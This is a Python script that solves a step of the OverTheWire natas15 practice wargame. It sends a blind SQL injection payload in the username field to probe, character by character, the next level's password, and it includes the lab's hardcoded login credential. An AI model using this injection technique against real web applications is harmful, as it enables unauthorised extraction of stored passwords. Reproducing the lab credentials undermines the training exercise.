import time
from requests import post
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

for char in chars:
    data = {'username': f"natas16\" and password LIKE BINARY \"{char}%\" #"}

    max_tries = 5
    try_count = 0

    while True:
        try:
            response = post('http://natas15.natas.labs.overthewire.org/index.php', 
                            auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), 
                            data=data)

            if 'exists' in response.text:
                print(f"I found: {char}")

            break

        except Exception as e:
            try_count += 1

            # If maximum tries reached raise the exception
            if try_count > max_tries:
                raise
            else:
                print(f"Failed to connect. Retrying in {2 ** (try_count - 1)} seconds...")

            time.sleep(2 ** (try_count - 1))